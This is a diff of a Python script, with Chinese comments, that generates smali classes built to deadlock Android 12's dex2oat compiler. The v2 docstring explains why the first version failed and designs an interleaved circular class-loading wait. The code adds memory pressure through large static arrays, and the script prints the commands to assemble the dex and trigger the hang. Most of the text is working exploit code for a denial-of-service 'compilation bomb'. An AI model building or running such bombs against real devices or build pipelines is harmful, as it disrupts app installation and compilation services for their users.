@@ -1,201 +1,236 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-dex2oat ResolveClassFieldsAndMethodsVisitor 死锁编译炸弹生成器
+dex2oat ResolveClassFieldsAndMethodsVisitor 死锁编译炸弹 v2（高概率版）
 
-原理（Android 12 art/dex2oat/driver/compiler_driver.cc:1512-1629）：
-  ResolveClassFieldsAndMethodsVisitor::Visit() 在线程池中并行执行。
-  每个 worker 持有 mutator_lock_(SHARED via ScopedObjectAccess)，
-  然后对类中每个方法调用 ResolveMethod → 解析返回/参数类型 →
-  FindClass → LoadClass → 需要 classlinker_classes_lock_ 排他锁。
-  当多个 worker 同时对交叉引用的类执行此操作时，
-  classlinker_classes_lock_ 上的争抢 + 深层递归类加载形成活锁，
-  主线程在 thread_pool_->Wait() 中无限等待，直至看门狗超时（9.5min）。
+v1 为什么失败:
+  ResolveMethod<kNoChecks>(compiler_driver.cc:1595) 只解析方法的声明类,
+  不解析参数/返回类型。方法签名的交叉引用不会触发 LoadClass。
+  只有 ResolveField (line 1608/1616) 才解析字段的**类型**,触发 LoadClass。
+  v1 每类仅 3 个字段,LoadClass 瞬间完成缓存——窗口太窄。
 
-构造策略:
-  - N 对类 (Ai, Bi)，共 2N 个类
-  - Ai 的所有方法都引用 Bi 作为返回类型和参数类型
-  - Bi 的所有方法都引用 Ai 作为返回类型和参数类型
-  - 每类 30+ 方法，每个 Visit 耗时长 → 增加碰撞窗口
-  - 再叠加接口引用链路 Ai→I→Bi, Bi→J→Ai → 增加 LoadClass 深度
-  - 全部放在一个 dex 中（同一个 ResolveDexFile 调用分发给线程池）
+v2 原理——循环类加载死锁(WaitForClass mutual dependency):
+  ART 的 LoadClass 流程:
+    1. 插入占位符(ClassStatus < kLoaded)
+    2. 加载超类(递归 LoadClass)
+    3. 加载接口
+    4. DefineClass → 需要解析字段类型 → ResolveField → LoadClass(字段类型)
+    5. 标记 kLoaded
 
-用法:
-  python gen_deadlock_bomb.py  # 生成 smali/ 目录
-  # 然后用 smali.jar 或 d8 编译成 dex
-  # java -jar smali.jar assemble smali/ -o deadlock_bomb.dex
-  # dex2oat --dex-file=deadlock_bomb.dex --oat-file=out.oat --compiler-filter=speed -j8 --watchdog-timeout=600000
+  如果线程 T0 正在 LoadClass(A)(有占位符)并在 DefineClass 阶段
+  调用 LoadClass(B),而线程 T1 正在 LoadClass(B)(有占位符)并在
+  DefineClass 阶段调用 LoadClass(A),则:
+    - LoadClass(B) from T0: 发现 B 有 T1 的占位符 → WaitForClass(B) → 阻塞
+    - LoadClass(A) from T1: 发现 A 有 T0 的占位符 → WaitForClass(A) → 阻塞
+    → 循环等待 = 死锁
+
+v2 结构(每对 n):
+  链 A:  SuperLeafA_n(extends Object, field refToLeafB_n)
+          ↑ SuperMidA_n(field refToMidB_n)
+          ↑ SuperTopA_n(field refToTopB_n)
+          ↑ PairA_n (extends SuperTopA_n, 8 字段 + 15 方法)
+
+  链 B:  SuperLeafB_n(extends Object, field refToLeafA_n)  ← 镜像
+          ↑ SuperMidB_n(field refToMidA_n)
+          ↑ SuperTopB_n(field refToTopA_n)
+          ↑ PairB_n
+
+  class_def 表中 interleave:
+    SuperLeafA_0, SuperLeafB_0, SuperMidA_0, SuperMidB_0,
+    SuperTopA_0, SuperTopB_0, PairA_0, PairB_0, ...
+
+  确保线程 T0(取 LeafA_0)和 T1(取 LeafB_0)同时处理,
+  各自 LoadClass 的 DefineClass 阶段解析对方类型的字段→循环等待。
 """
 
-import os
+import os, sys
 
-N_PAIRS = 80        # 80 对 = 160 个类
-METHODS_PER = 30    # 每类方法数
+N_PAIRS = 120     # 120 对 = 960 个类(含超类链)
+LEVELS = 3        # 每链 3 层超类: Leaf → Mid → Top
+FIELDS = 10       # 每类字段数(包括超类)
+METHODS = 20      # Pair 类的方法数
+IFACE_COUNT = 8   # 接口数
 OUT_DIR = "smali"
-PACKAGE = "Lbomb"
+PACKAGE = "Lb"
 
 os.makedirs(OUT_DIR, exist_ok=True)
 
-# 关键：配对类必须在 class_def 表中相邻，这样线程池的 fetch_add 分发
-# 才会让不同线程同时处理相互引用的 A_n 和 B_n。
-# 命名用 `bomb_PP_{pair_idx}_A.smali` / `bomb_PP_{pair_idx}_B.smali`，
-# 按字母序排列时，同一 pair_idx 的 A/B 紧邻。
+# --- interleaved 文件列表 ---
+# 结构: 先出所有 Level 3(Leaf)的 A/B,再出 Level 2(Mid),再出 Level 1(Top),再出 Pair
+# 确保任意相邻 pair_idx 的 A 和 B 会被不同线程同时处理
 
-NAMES = []
+files = []  # [(filename, self_class_full, super_class_full, field_target_full, fields_count, is_pair, iface_indices)]
+
 for pi in range(N_PAIRS):
-    NAMES.append((f"bomb_PP_{pi:03d}_A", f"PairA{pi}", f"PairB{pi}", pi % 8))
-    NAMES.append((f"bomb_PP_{pi:03d}_B", f"PairB{pi}", f"PairA{pi}", (pi + 1) % 8))
-# NAMES = [(filename_prefix, self_class, paired_class, iface_idx), ...]
-# 排序后：bomb_PP_000_A, bomb_PP_000_B, bomb_PP_001_A, bomb_PP_001_B, ...
-NAMES.sort()  # 确保 A/B 对紧邻
+    leafA_super = "Ljava/lang/Object;"
+    leafB_super = "Ljava/lang/Object;"
+    midA_super  = f"{PACKAGE}/LeafA{pi};"
+    midB_super  = f"{PACKAGE}/LeafB{pi};"
+    topA_super  = f"{PACKAGE}/MidA{pi};"
+    topB_super  = f"{PACKAGE}/MidB{pi};"
+    pairA_super = f"{PACKAGE}/TopA{pi};"
+    pairB_super = f"{PACKAGE}/TopB{pi};"
 
-# 辅助：生成方法签名——每方法有多个参数和返回类型，密集引用配对类
-def gen_methods(class_idx, paired_class_name, other_pairs):
-    """生成 METHODS_PER 个方法，参数/返回类型密集引用配对类和其他随机类。"""
-    out = []
-    for m in range(METHODS_PER):
-        # 返回类型：在配对类和其他类之间交替
-        if m % 4 == 0:
-            ret = paired_class_name
-        elif m % 4 == 1:
-            # 随机另一个配对的目标类
-            ri = (class_idx + m * 7 + 3) % N_PAIRS
-            if ri % 2 == 0:
-                ret = f"{PACKAGE}/PairB{ri // 2};"
+    # 每层的字段引用的目标:指向对方的同层类
+    # LeafA.field → LeafB
+    # MidA.field → MidB
+    # TopA.field → TopB
+    # PairA.field → PairB(主) + 随机扩散
+
+    # Level 3 (Leaf): 只有1个字段(引用对方的 Leaf)
+    files.append((f"zz_LL_{pi:04d}_A",
+                  f"{PACKAGE}/LeafA{pi}", leafA_super,
+                  f"{PACKAGE}/LeafB{pi};", 1, False, []))
+    files.append((f"zz_LL_{pi:04d}_B",
+                  f"{PACKAGE}/LeafB{pi}", leafB_super,
+                  f"{PACKAGE}/LeafA{pi};", 1, False, []))
+
+    # Level 2 (Mid): 字段引用对方的 Mid
+    files.append((f"zz_MM_{pi:04d}_A",
+                  f"{PACKAGE}/MidA{pi}", midA_super,
+                  f"{PACKAGE}/MidB{pi};", 1, False, []))
+    files.append((f"zz_MM_{pi:04d}_B",
+                  f"{PACKAGE}/MidB{pi}", midB_super,
+                  f"{PACKAGE}/MidA{pi};", 1, False, []))
+
+    # Level 1 (Top): 字段引用对方的 Top
+    files.append((f"zz_TT_{pi:04d}_A",
+                  f"{PACKAGE}/TopA{pi}", topA_super,
+                  f"{PACKAGE}/TopB{pi};", 1, False, []))
+    files.append((f"zz_TT_{pi:04d}_B",
+                  f"{PACKAGE}/TopB{pi}", topB_super,
+                  f"{PACKAGE}/TopA{pi};", 1, False, []))
+
+    # Pair: 主类, 多字段 + 多方法
+    ifaces = [f"{PACKAGE}/I{pi % IFACE_COUNT}",
+              f"{PACKAGE}/I{(pi + 1) % IFACE_COUNT}"]
+    files.append((f"zz_PP_{pi:04d}_A",
+                  f"{PACKAGE}/PairA{pi}", pairA_super,
+                  f"{PACKAGE}/PairB{pi};", FIELDS, True, ifaces))
+    files.append((f"zz_PP_{pi:04d}_B",
+                  f"{PACKAGE}/PairB{pi}", pairB_super,
+                  f"{PACKAGE}/PairA{pi};", FIELDS, True, ifaces))
+
+files.sort()
+
+# 生成接口
+for i in range(IFACE_COUNT):
+    lines = [f".class public interface abstract {PACKAGE}/I{i};",
+             ".super Ljava/lang/Object;", ""]
+    for m in range(4):
+        rp = (i * 13 + m * 7) % N_PAIRS
+        t = f"PairA{rp}" if (i + m) % 2 == 0 else f"PairB{rp}"
+        lines.append(f".method public abstract iface_m{m}()L{PACKAGE}/{t};")
+        lines.append(".end method\n")
+    path = os.path.join(OUT_DIR, f"xx_IF_{i:02d}.smali")
+    with open(path, "w", encoding="utf-8") as f:
+        f.write("\n".join(lines))
+
+
+def gen_class(filename, own, super_cls, main_field_type, n_fields, is_pair, ifaces):
+    own_short = own.split("/")[-1].rstrip(";")
+    lines = [f".class public {own}",
+             f".super {super_cls}"]
+    for iface in ifaces:
+        lines.append(f".implements {iface}")
+    lines.append("")
+
+    # 静态大数组 + <clinit>: 内存压力 → GC 概率↑
+    arr_size = 0x1000 if is_pair else 0x200  # 4096 vs 512 ints
+    lines.append(".field static bigArray:[I")
+    lines.append(".field static bigArrayB:[B")
+    lines.append("")
+    lines.append(".method static constructor <clinit>()V")
+    lines.append("    .registers 3")
+    lines.append(f"    const/16 v0, {hex(arr_size)}")
+    lines.append("    new-array v0, v0, [I")
+    lines.append(f"    sput-object v0, {own}->bigArray:[I")
+    lines.append(f"    const/16 v0, {hex(arr_size // 2)}")
+    lines.append("    new-array v0, v0, [B")
+    lines.append(f"    sput-object v0, {own}->bigArrayB:[B")
+    lines.append("    return-void")
+    lines.append(".end method\n")
+
+    # 实例字段 —— 这是触发 LoadClass 的核心
+    # 字段 0: 主引用(对方类的对应层级)
+    lines.append(f".field public ref0:L{main_field_type}")
+
+    if n_fields > 1:
+        for fi in range(1, n_fields):
+            # 轮番用不同的交叉引用类型,不让任何类型被提前缓存命中的线程"独吞"
+            seed = hash(f"{own_short}_{fi}") % N_PAIRS
+            if fi % 3 == 0:
+                t = f"{PACKAGE}/PairA{seed};"
+            elif fi % 3 == 1:
+                t = f"{PACKAGE}/PairB{seed};"
             else:
-                ret = f"{PACKAGE}/PairA{ri // 2};"
-        elif m % 4 == 2:
-            # 接口引用（增加 LoadClass 递归深度）
-            ret = f"{PACKAGE}/I{m % 8};"
-        else:
-            ret = "I"  # int，偶尔简单类型
+                t = f"{PACKAGE}/I{seed % IFACE_COUNT};"
+            lines.append(f".field public ref{fi}:L{t}")
+    lines.append("")
 
-        # 参数列表：1-5 个参数，混合类型
-        n_params = 1 + ((m * 3 + class_idx) % 5)
-        params = []
-        for p in range(n_params):
-            ptype = m % 3
-            if ptype == 0:
-                params.append(paired_class_name)  # 主力：配对类
-            elif ptype == 1:
-                ri = (class_idx + p * 13 + m) % N_PAIRS
-                if ri % 3 == 0:
-                    params.append(f"{PACKAGE}/PairA{ri};")
-                elif ri % 3 == 1:
-                    params.append(f"{PACKAGE}/PairB{ri};")
+    # 构造
+    lines.append(".method public constructor <init>()V")
+    lines.append("    .registers 1")
+    lines.append(f"    invoke-direct {{p0}}, {super_cls}-><init>()V")
+    lines.append("    return-void")
+    lines.append(".end method\n")
+
+    # Pair 类加方法(虽然不触发 LoadClass,但增加 Visit 耗时,扩大碰撞窗口)
+    if is_pair:
+        for m in range(METHODS):
+            mp = 1 + ((m * 3 + hash(own_short)) % 5)
+            params = []
+            for p in range(mp):
+                s = hash(f"{own_short}_m{m}_p{p}") % N_PAIRS
+                if p % 3 == 0:
+                    params.append(f"{PACKAGE}/PairB{s};")
+                elif p % 3 == 1:
+                    params.append(f"{PACKAGE}/I{s % IFACE_COUNT};")
                 else:
-                    params.append(f"{PACKAGE}/I{ri % 8};")
+                    params.append("I")
+            param_str = "".join(params)
+
+            # 返回类型
+            if m % 3 == 0:
+                ret = f"{PACKAGE}/PairB{(hash(own_short) + m) % N_PAIRS};"
+            elif m % 3 == 1:
+                ret = "I"
             else:
-                params.append("I")  # int
+                ret = f"{PACKAGE}/I{(hash(own_short) + m) % IFACE_COUNT};"
 
-        param_str = "".join(params)
-        out.append(f".method public m{m}({param_str}){ret}")
-        out.append(f"    .registers {n_params + 2}")
-        if ret == "I":
-            out.append("    const/4 v0, 0x0")
-            out.append("    return v0")
-        elif ret.startswith("["):
-            out.append("    const/4 v0, 0x0")
-            out.append("    new-array v0, v0, [Ljava/lang/Object;")
-            out.append("    return-object v0")
-        else:
-            out.append("    const/4 v0, 0x0")
-            out.append("    return-object v0")
-        out.append(".end method")
-        out.append("")
-    return out
+            lines.append(f".method public m{m}({param_str}){ret}")
+            lines.append(f"    .registers {mp + 2}")
+            if ret == "I":
+                lines.append("    const/4 v0, 0x0")
+                lines.append("    return v0")
+            else:
+                lines.append("    const/4 v0, 0x0")
+                lines.append("    return-object v0")
+            lines.append(".end method\n")
 
-# 生成接口（增加类层级深度）
-for i in range(8):
-    smali = []
-    smali.append(f".class public interface abstract {PACKAGE}/I{i};")
-    smali.append(".super Ljava/lang/Object;")
-    smali.append("")
-    # 每个接口有少量方法，引用各种类型
-    for m in range(3):
-        ri = (i * 7 + m * 3) % N_PAIRS
-        smali.append(f".method public abstract iface_m{m}_{i}()L{PACKAGE}/PairA{ri};")
-        smali.append(".end method")
-        smali.append("")
-    path = os.path.join(OUT_DIR, f"bomb_I{i}.smali")
+    path = os.path.join(OUT_DIR, f"{filename}.smali")
     with open(path, "w", encoding="utf-8") as f:
-        f.write("\n".join(smali))
+        f.write("\n".join(lines))
 
-# 生成类对（interleaved 顺序：A0, B0, A1, B1, ...）
-for fname, self_cls, paired_cls, iface_idx in NAMES:
-    own = f"{PACKAGE}/{self_cls};"
-    paired_class = f"{PACKAGE}/{paired_cls};"
-    smali = []
-    smali.append(f".class public {own}")
-    smali.append(".super Ljava/lang/Object;")
-    smali.append(f".implements {PACKAGE}/I{iface_idx};")
-    smali.append("")
 
-    # 静态字段 + <clinit> 制造内存压力
-    smali.append(f".field static bigArray:[I")
-    smali.append("")
-    smali.append(".method static constructor <clinit>()V")
-    smali.append("    .registers 2")
-    smali.append("    const/16 v0, 0x400")
-    smali.append("    new-array v0, v0, [I")
-    smali.append(f"    sput-object v0, {own}->bigArray:[I")
-    smali.append("    return-void")
-    smali.append(".end method")
-    smali.append("")
-
-    # 实例字段：引用配对类 + 额外交叉引用增加复杂度
-    smali.append(f".field public ref:L{paired_class}")
-    smali.append(f".field public ref2:L{paired_class}")
-    # 额外字段引用其他类，随机扩散
-    ri = (hash(self_cls) * 3 + 5) % N_PAIRS
-    extra = f"PairB{ri}" if "PairA" in self_cls else f"PairA{ri}"
-    smali.append(f".field public cross:L{PACKAGE}/{extra};")
-    smali.append("")
-
-    # 构造函数
-    smali.append(".method public constructor <init>()V")
-    smali.append("    .registers 1")
-    smali.append("    invoke-direct {p0}, Ljava/lang/Object;-><init>()V")
-    smali.append("    return-void")
-    smali.append(".end method")
-    smali.append("")
-
-    # 大量方法，密集引用配对类
-    smali.extend(gen_methods(hash(self_cls) % 10000, paired_class, N_PAIRS))
-
-    path = os.path.join(OUT_DIR, f"{fname}.smali")
-    with open(path, "w", encoding="utf-8") as f:
-        f.write("\n".join(smali))
-
-# 删除旧的不按 interleave 排列的残留文件
-import glob as _glob
-_old = set(_glob.glob(os.path.join(OUT_DIR, "bomb_Pair*.smali")))
-_kept = set(os.path.join(OUT_DIR, f"{n}.smali") for n, _, _, _ in NAMES)
-for f in _old - _kept:
-    os.remove(f)
+# 生成所有类
+for fname, own, super_cls, main_ft, nf, is_pair, ifaces in files:
+    gen_class(fname, own, super_cls, main_ft, nf, is_pair, ifaces)
 
 # 统计
-total_files = len(os.listdir(OUT_DIR))
-total_methods = 2 * N_PAIRS * METHODS_PER + 2 * N_PAIRS * 2 + 8 * 3
-total_fields = 2 * N_PAIRS * 3
-print(f"生成了 {total_files} 个 smali 文件（{2*N_PAIRS} 个类 + 8 个接口）")
-print(f"  每类 {METHODS_PER} 个交叉引用方法 + 构造 + <clinit>")
-print(f"  总方法: ~{total_methods}")
-print(f"  总字段: ~{total_fields}")
-print(f"  交叉引用对: {N_PAIRS}")
-print(f"  命名策略: interleaved（A_n 与 B_n 紧邻 → 线程池并行取到时碰撞）")
+total = len(os.listdir(OUT_DIR))
+pairs = 2 * N_PAIRS
+hierarchy = 2 * N_PAIRS * LEVELS
+total_methods = (pairs * METHODS + pairs * 2 + hierarchy * 2 + IFACE_COUNT * 4)
+total_fields = (pairs * FIELDS + hierarchy * 1)
+print(f"{total} smali 文件")
+print(f"  Pair 类: {pairs} (各 {METHODS} 方法 + {FIELDS} 字段 + <clinit>)")
+print(f"  超类链:  {hierarchy} ({N_PAIRS}对 × {LEVELS}层 × 2链)")
+print(f"  接口:    {IFACE_COUNT}")
+print(f"  总字段:  ~{total_fields} (每个字段触发一次 LoadClass)")
+print(f"  总方法:  ~{total_methods}")
+print(f"  Interleave: LeafA_n, LeafB_n, MidA_n, MidB_n, TopA_n, TopB_n, PairA_n, PairB_n")
+print(f"  ← 确保线程池 fetch_add 将互补类分给不同线程")
 print()
-print("编译命令（需要 smali.jar 或 d8）：")
-print(f"  java -jar smali.jar assemble {OUT_DIR}/ -o deadlock_bomb.dex")
-print()
-print("触发命令（在 Android 12 设备上）：")
-print("  dex2oat --dex-file=deadlock_bomb.dex --oat-file=/data/local/tmp/bomb.oat \\")
-print("    --compiler-filter=speed -j8 --watchdog-timeout=600000")
-print()
-print("预期效果：")
-print("  - 8 线程并行 ResolveClassFieldsAndMethodsVisitor")
-print("  - 每个 Visit 调用 ~30 次 ResolveMethod + ~3 次 ResolveField")
-print("  - 每次 ResolveMethod 都触发交叉类的 LoadClass")
-print("  - classlinker_classes_lock_ 激烈争抢 + 递归类加载深度")
-print("  - 主线程卡在 thread_pool_->Wait()")
-print("  - 10 分钟内不返回 → 看门狗 Fatal exit(1)")
+print(f"编译: java -jar smali.jar assemble {OUT_DIR}/ -o deadlock_bomb_v2.dex")
+print(f"触发: dex2oat --dex-file=deadlock_bomb_v2.dex --oat-file=/data/local/tmp/b.oat --compiler-filter=speed -j16")
